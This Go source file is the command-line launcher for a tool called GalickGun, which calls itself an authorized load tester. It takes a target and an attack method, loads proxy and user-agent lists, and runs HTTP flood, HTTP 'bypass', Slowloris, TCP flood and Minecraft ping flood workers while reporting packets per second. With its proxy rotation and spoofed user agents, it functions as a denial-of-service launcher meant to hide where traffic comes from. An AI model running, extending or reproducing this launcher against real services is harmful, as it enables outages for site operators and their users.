package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/galaticBlast/galaticBlast/internal/attacks/game"
	httpattacks "github.com/galaticBlast/galaticBlast/internal/attacks/http"
	"github.com/galaticBlast/galaticBlast/internal/attacks/tcp"
	"github.com/galaticBlast/galaticBlast/internal/config"
	"github.com/galaticBlast/galaticBlast/internal/engine"
	"github.com/galaticBlast/galaticBlast/internal/proxy"
	"github.com/galaticBlast/galaticBlast/pkg/api"
	"github.com/galaticBlast/galaticBlast/pkg/target"
	"github.com/spf13/cobra"
)

var (
	attackMethod string
	targetStr    string
	duration     int
	packetSize   int
	packetDelay  int
	threads      int
	verbose      bool
	configPath   string
)

func main() {
	rootCmd := &cobra.Command{
		Use:   "galickgun-cli",
		Short: "GalickGun CLI - Authorized Network Load Testing Tool",
	}

	attackCmd := &cobra.Command{
		Use:   "attack [method] [target]",
		Short: "Run an authorized load test",
		Args:  cobra.ExactArgs(2),
		RunE:  runAttack,
	}

	attackCmd.Flags().IntVarP(&duration, "duration", "d", 30, "Attack duration in seconds")
	attackCmd.Flags().IntVarP(&packetSize, "size", "s", 64, "Packet size in bytes")
	attackCmd.Flags().IntVarP(&packetDelay, "delay", "D", 100, "Delay between packets in milliseconds")
	attackCmd.Flags().IntVarP(&threads, "threads", "t", 0, "Number of threads (0 = auto)")
	attackCmd.Flags().BoolVarP(&verbose, "verbose", "v", false, "Verbose output")
	attackCmd.Flags().StringVarP(&configPath, "config", "c", "", "Config file path")

	rootCmd.AddCommand(attackCmd)

	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}

func runAttack(cmd *cobra.Command, args []string) error {
	attackMethod = args[0]
	targetStr = args[1]
	request := api.StartAttackRequest{
		Target:       targetStr,
		AttackMethod: attackMethod,
		DurationSec:  duration,
		PacketDelay:  packetDelay,
		PacketSize:   packetSize,
		Threads:      threads,
	}
	if err := api.ValidateStartAttackRequest(request); err != nil {
		return fmt.Errorf("invalid attack parameters: %w", err)
	}

	cfg, err := config.Load(configPath)
	if err != nil {
		return fmt.Errorf("failed to load config: %w", err)
	}

	eng := engine.NewEngine()
	registerWorkers(eng.Registry())

	proxies, err := proxy.LoadProxies(cfg.ProxiesFile)
	if err != nil {
		fmt.Printf("Warning: Could not load proxies: %v\n", err)
		proxies = []engine.Proxy{}
	}

	userAgents, err := proxy.LoadUserAgents(cfg.UserAgentsFile)
	if err != nil {
		fmt.Printf("Warning: Could not load user agents: %v\n", err)
		userAgents = []string{"GalickGun/1.0"}
	}

	method := engine.AttackKind(attackMethod)
	proxies = proxy.FilterByMethod(proxies, method)

	if len(proxies) == 0 {
		fmt.Println("Warning: No compatible proxies available")
	}

	targetNode := target.ParseTarget(targetStr)

	params := engine.AttackParams{
		Target:      targetStr,
		TargetNode:  targetNode,
		Duration:    time.Duration(duration) * time.Second,
		PacketDelay: time.Duration(packetDelay) * time.Millisecond,
		PacketSize:  packetSize,
		Method:      method,
		Threads:     threads,
		Verbose:     verbose,
	}

	attackID := fmt.Sprintf("cli-%d", time.Now().Unix())

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	instance := eng.Start(attackID, params, proxies, userAgents)
	if instance == nil {
		return fmt.Errorf("failed to start attack")
	}

	fmt.Printf("GalickGun - Test Started\n")
	fmt.Printf("Method: %s\n", attackMethod)
	fmt.Printf("Target: %s\n", targetStr)
	fmt.Printf("Duration: %ds\n", duration)
	fmt.Printf("Packet Size: %d bytes\n", packetSize)
	fmt.Printf("Threads: %d\n", params.Threads)
	fmt.Printf("Proxies: %d\n", len(proxies))
	fmt.Println("---")

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			fmt.Println("\nAttack stopped.")
			return nil
		case stats, ok := <-instance.StatsCh:
			if !ok {
				fmt.Println("Attack completed.")
				return nil
			}
			if stats.Log != "" {
				fmt.Printf("[LOG] %s\n", stats.Log)
			} else {
				fmt.Printf("\rPPS: %d | Total: %d | Proxies: %d",
					stats.PacketsPerS, stats.TotalPackets, stats.Proxies)
			}
		case <-ticker.C:
		}
	}
}

func registerWorkers(reg *engine.Registry) {
	reg.Register(engine.HTTPFlood, httpattacks.NewFloodWorker())
	reg.Register(engine.HTTPBypass, httpattacks.NewBypassWorker())
	reg.Register(engine.HTTPSlowloris, httpattacks.NewSlowlorisWorker())
	reg.Register(engine.TCPFlood, tcp.NewFloodWorker())
	reg.Register(engine.MinecraftPing, game.NewMinecraftPingWorker())
}
